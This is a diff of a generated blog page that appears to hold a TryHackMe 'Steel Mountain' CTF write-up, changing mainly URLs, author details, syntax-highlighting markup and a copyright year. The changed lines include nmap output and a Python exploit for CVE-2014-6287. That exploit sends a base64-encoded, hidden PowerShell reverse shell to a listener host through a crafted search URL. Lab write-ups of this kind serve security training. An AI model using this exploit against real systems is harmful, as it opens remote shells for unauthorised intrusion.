@@ -18,14 +18,14 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="bynafrez08.io">
 <meta property="og:title" content="THM - SteelMountain">
-<meta property="og:url" content="http://localhost:4000/thm-steelMountain/">
+<meta property="og:url" content="http://0.0.0.0:4000/thm-steelMountain/">
 
 
   <meta property="og:description" content="Steelmountain is windows machine inspired by the mr.robot serie, first we have a little osint challenge we need to indentify the person on the image on the website then we exploit the CVE-2014-6287  to gain access to the target machine and…">
 
 
 
-  <meta property="og:image" content="http://localhost:4000/assets/images/img-steelMountain/portada.jpeg">
+  <meta property="og:image" content="http://0.0.0.0:4000/assets/images/img-steelMountain/portada.jpeg">
 
 
 
@@ -42,7 +42,7 @@
   
 
 
-<link rel="canonical" href="http://localhost:4000/thm-steelMountain/">
+<link rel="canonical" href="http://0.0.0.0:4000/thm-steelMountain/">
 
 
 
@@ -55,7 +55,7 @@
       "@context": "https://schema.org",
       "@type": "Person",
       "name": "",
-      "url": "http://localhost:4000",
+      "url": "http://0.0.0.0:4000",
       "sameAs": null
     }
   </script>
@@ -160,7 +160,7 @@
     
       
         <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <a href="http://0.0.0.0:4000/" itemprop="item"><span itemprop="name">Home</span></a>
           <meta itemprop="position" content="1" />
         </li>
         <span class="sep">/</span>
@@ -188,18 +188,18 @@
       
 
       
-        <img src="/assets/images/avatar1.png" alt="Nafsu Uddin | AKA bynafrez" itemprop="image">
+        <img src="/assets/images/avatar1.png" alt="bynafrez" itemprop="image">
       
     </div>
   
 
   <div class="author__content">
     
-      <h3 class="author__name" itemprop="name">Nafsu Uddin | AKA bynafrez</h3>
+      <h3 class="author__name" itemprop="name">bynafrez</h3>
     
     
       <p class="author__bio" itemprop="description">
-        Networking / Pentesting / Offensive Security
+        Offensive Security / CTF / Networking / IT enthusiast
       </p>
     
   </div>
@@ -339,14 +339,14 @@
 <p>This is the nmap scan result with the following ports that i have discovered with a previous scan. We can see the following ports with versions of the services and the nmap scan reports us that the smb is not signed, so this can be useful to enumerate hosts or the target machine with the smb protocol.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Nmap 7.92 scan initiated Fri May 27 17:11:26 2022 as: nmap -sCV -p80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49163,49164 -oN targeted 10.10.97.160
-</span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.97.160</span>
-<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.046</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+</span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">97.160</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.046</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
 
 <span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>            <span class="n">VERSION</span>
 <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>               <span class="n">Microsoft</span> <span class="n">IIS</span> <span class="n">httpd</span> <span class="mf">8.5</span>
 <span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
 <span class="o">|</span><span class="n">_</span>  <span class="n">Potentially</span> <span class="n">risky</span> <span class="n">methods</span><span class="p">:</span> <span class="n">TRACE</span>
-<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesnt</span> <span class="n">have</span> <span class="n">a</span> <span class="n">title</span> <span class="p">(</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">)</span><span class="o">.</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesnt</span> <span class="n">have</span> <span class="n">a</span> <span class="n">title</span> <span class="p">(</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">).</span>
 <span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">8.5</span>
 <span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
 <span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>        <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
@@ -358,12 +358,12 @@
 <span class="o">|</span>   <span class="n">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="n">STEELMOUNTAIN</span>
 <span class="o">|</span>   <span class="n">DNS_Domain_Name</span><span class="p">:</span> <span class="n">steelmountain</span>
 <span class="o">|</span>   <span class="n">DNS_Computer_Name</span><span class="p">:</span> <span class="n">steelmountain</span>
-<span class="o">|</span>   <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">6.3.9600</span>
+<span class="o">|</span>   <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">6.3</span><span class="p">.</span><span class="mi">9600</span>
 <span class="o">|</span><span class="n">_</span>  <span class="n">System_Time</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">52</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
 <span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">steelmountain</span>
 <span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">26</span><span class="n">T20</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">40</span>
 <span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">25</span><span class="n">T20</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">40</span>
-<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">57</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">2</span><span class="n">s</span> <span class="k">from</span> <span class="n">scanner</span> <span class="n">time</span><span class="o">.</span>
+<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">57</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">2</span><span class="n">s</span> <span class="k">from</span> <span class="n">scanner</span> <span class="n">time</span><span class="p">.</span>
 <span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>               <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
 <span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
 <span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span>
@@ -389,14 +389,14 @@
 <span class="o">|</span>   <span class="n">challenge_response</span><span class="p">:</span> <span class="n">supported</span>
 <span class="o">|</span><span class="n">_</span>  <span class="n">message_signing</span><span class="p">:</span> <span class="n">disabled</span> <span class="p">(</span><span class="n">dangerous</span><span class="p">,</span> <span class="n">but</span> <span class="n">default</span><span class="p">)</span>
 <span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
-<span class="o">|</span>   <span class="mf">3.0.2</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mf">3.0</span><span class="p">.</span><span class="mi">2</span><span class="p">:</span> 
 <span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">but</span> <span class="ow">not</span> <span class="n">required</span>
 <span class="o">|</span><span class="n">_nbstat</span><span class="p">:</span> <span class="n">NetBIOS</span> <span class="n">name</span><span class="p">:</span> <span class="n">STEELMOUNTAIN</span><span class="p">,</span> <span class="n">NetBIOS</span> <span class="n">user</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">unknown</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">NetBIOS</span> <span class="n">MAC</span><span class="p">:</span> <span class="mi">02</span><span class="p">:</span><span class="n">f7</span><span class="p">:</span><span class="mi">82</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">51</span> <span class="p">(</span><span class="n">unknown</span><span class="p">)</span>
 <span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span> 
 <span class="o">|</span>   <span class="n">date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">51</span>
 <span class="o">|</span><span class="n">_</span>  <span class="n">start_date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T20</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">34</span>
 
-<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
+<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
 <span class="c1"># Nmap done at Fri May 27 17:12:55 2022 -- 1 IP address (1 host up) scanned in 89.18 seconds
 </span></code></pre></div></div>
 
@@ -470,19 +470,19 @@
 <span class="n">rport</span> <span class="o">=</span> <span class="mi">8080</span>
 
 <span class="c1"># Define the command to be written to a file
-</span><span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s">'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|</span><span class="si">%</span><span class="s">{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "&gt; "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'</span>
+</span><span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'$client = New-Object System.Net.Sockets.TCPClient("</span><span class="si">{</span><span class="n">lhost</span><span class="si">}</span><span class="s">",</span><span class="si">{</span><span class="n">lport</span><span class="si">}</span><span class="s">); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "&gt; "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'</span>
 
 <span class="c1"># Encode the command in base64 format
-</span><span class="n">encoded_command</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-16le"</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span><span class="n">encoded_command</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-16le"</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>
 <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Encoded the command in base64 format..."</span><span class="p">)</span>
 
 <span class="c1"># Define the payload to be included in the URL
-</span><span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s">'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'</span>
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand </span><span class="si">{</span><span class="n">encoded_command</span><span class="si">}</span><span class="s">'</span>
 
 <span class="c1"># Encode the payload and send a HTTP GET request
-</span><span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">'http://{rhost}:{rport}/?search=</span><span class="si">%00</span><span class="s">{{.{encoded_payload}.}}'</span>
-<span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span><span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">rport</span><span class="si">}</span><span class="s">/?search=%00{{.</span><span class="si">{</span><span class="n">encoded_payload</span><span class="si">}</span><span class="s">.}}'</span>
+<span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
 <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Encoded the payload and sent a HTTP GET request to the target..."</span><span class="p">)</span>
 
 <span class="c1"># Print some information
@@ -700,7 +700,7 @@ C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2022 bynafrez08.io</div>
+<div class="page__footer-copyright">&copy; 2025 bynafrez08.io</div>
 
       </footer>
     </div>
